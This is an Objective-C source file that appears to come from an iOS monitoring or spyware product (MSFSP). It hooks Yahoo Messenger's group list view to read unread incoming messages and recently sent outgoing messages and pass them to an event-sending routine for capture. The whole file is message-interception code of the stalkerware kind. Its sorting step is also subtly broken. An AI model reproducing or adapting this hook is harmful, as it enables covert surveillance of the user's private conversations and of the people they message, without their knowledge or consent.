//
//  YahooMessengerIris.h
//  MSFSP
//
//  Created by Khaneid Hantanasiriskul on 3/8/2559 BE.
//
//

#import <Foundation/Foundation.h>

#import "IRSequenceAdapter.h"
#import "IRSequence.h"
#import "Item.h"
#import "GroupListViewController.h"
#import "GroupListResult.h"
#import "Group.h"
#import "GroupProxy.h"
#import "IRCollation.h"
#import "IRCollationIterator.h"
#import "User.h"
#import "Media.h"
#import "Media+Yahoo.h"
#import "Member.h"
#import "IRKey.h"
#import "IRRun.h"
#import "YahooMsgIrisUtils.h"

#import <pthread.h>

#pragma mark -
#pragma Yahoo Messenger IRIS
#pragma mark -

HOOK(GroupListViewController, sequenceAdapter$performRowInserts$deletes$moves$, void, id arg1, id arg2, id arg3, id arg4) {
//    DLog(@"arg1 %@", arg1);
//    DLog(@"arg2 %@", arg2);
//    DLog(@"arg3 %@", arg3);
//    DLog(@"arg4 %@", arg4);
    
    CALL_ORIG(GroupListViewController, sequenceAdapter$performRowInserts$deletes$moves$, arg1, arg2, arg3, arg4);
    
        Class $IRRun = objc_getClass("IRRun");
    
        [$IRRun onDataThread:^{
            @try {
                //BOOL isDataThread = [$IRRun isDataThread];
                //DLog(@"isDataThread %d", isDataThread);
                NSMutableArray *shouldCaptureItemsArray = [NSMutableArray array];
                long long numberOfRow = [self tableView:self.tableView numberOfRowsInSection:0]; // self
                //IRSequenceAdapter *sequenceAdapter = self.dataSource;
                IRSequenceAdapter *sequenceAdapter = arg1;
                
                //DLog(@"sequenceAdapter %@, self.dataSource %@", sequenceAdapter, self.dataSource);
                //DLog(@"Number of row %ld", numberOfRow);
                
            for (long long i=0; i < numberOfRow; i++) {
                GroupListResult *groupList = [sequenceAdapter dataForRowAtIndexPath:[NSIndexPath indexPathForRow:i inSection:0]];
                GroupProxy *groupProxy = groupList.group;
                Group *group = groupProxy.input;
                
                if (group.unread) {
                    //DLog(@"unread group %@", group);
                    // all time that is smaller than latest time stamp;
                    // add to array
                    IRCollation *postedItem = group.postedItems;
                    IRCollationIterator *iterator = postedItem.iterator;
                    [iterator seekToLast];
                    
                    BOOL shouldStop = NO;
                    
                        while (iterator.isValid && !shouldStop) {
                            Item *item = iterator.value;
                            IRKey *itemKey = [item.postedItemKey copy];
                            long long createTime = item.createdTime;
                        
                            if ([[YahooMsgIrisUtils sharedYahooUtils] canCaptureMessageWithUniqueKey:itemKey.base64Data] && createTime >= [[YahooMsgIrisUtils sharedYahooUtils] mLastMessageTimestamp]) {
                                NSDictionary *captureDic = @{@"ItemKey": itemKey, @"Group": group, @"createTime": [NSNumber numberWithLongLong:createTime]};
                                [shouldCaptureItemsArray addObject:captureDic];
                                [itemKey release];
                            }
                        
                            if (createTime < [[YahooMsgIrisUtils sharedYahooUtils] mLastMessageTimestamp]) {
                                shouldStop = YES;
                            }
                            else {
                            [iterator prev];
                            }
                        }
                    }
                }
                
                //Capture Outgoing by checking last message in first group that already read
                GroupListResult *groupList = [sequenceAdapter dataForRowAtIndexPath:[NSIndexPath indexPathForRow:0 inSection:0]];
                GroupProxy *groupProxy = groupList.group;
                Group *group = groupProxy.input;
                
                if (!group.unread) {
                    //DLog(@"read group %@", group);
                    IRCollation *postedItem = group.postedItems;
                    IRCollationIterator *iterator = postedItem.iterator;
                    [iterator seekToLast];
                    
                    if (iterator.valid){
                        Item *item = iterator.value;
                        //DLog(@"sendState %@", item.sendState);
                        NSString *sendState = item.sendState;
                        IRKey *itemKey = [item.postedItemKey copy];
                        long long createTime = item.createdTime;
                        
                        if ([sendState isEqualToString:@"complete"] && [[YahooMsgIrisUtils sharedYahooUtils] canCaptureMessageWithUniqueKey:itemKey.base64Data] && createTime >= [[YahooMsgIrisUtils sharedYahooUtils] mLastMessageTimestamp]) {
                            NSDictionary *captureDic = @{@"ItemKey": itemKey, @"Group": group, @"createTime": [NSNumber numberWithLongLong:createTime]};
                            [shouldCaptureItemsArray addObject:captureDic];
                            [itemKey release];
                        }
                    }
                }
                
                //DLog(@"CAPTURE %lu Messages", (unsigned long)shouldCaptureItemsArray.count);
                
                if (shouldCaptureItemsArray.count > 0) {
                    [shouldCaptureItemsArray sortedArrayUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"createdTime" ascending:YES]]];
                    
                    [shouldCaptureItemsArray enumerateObjectsUsingBlock:^(NSDictionary *messageItemDic, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
                        IRKey *itemKey = messageItemDic[@"ItemKey"];
                        Group *group = messageItemDic[@"Group"];
                        [YahooMsgIrisUtils sendTextMessageEventForItemKey:itemKey inGroup:group];
                    }];

                    //For prevent crash
                    pthread_mutex_t yimMutex = [YahooMsgIrisUtils yahooIRisMutex];
                    pthread_mutex_lock(&yimMutex);
                    [NSThread sleepForTimeInterval:0.01];
                    pthread_mutex_unlock(&yimMutex );
                }
            }
            @catch (NSException *exception) {
                DLog(@"Yahoo Exception %@", exception);
            }
            @finally {
                ;
            }

        }
            result:^{
            //DLog(@"Finished");
        } blockUI:NO];
}
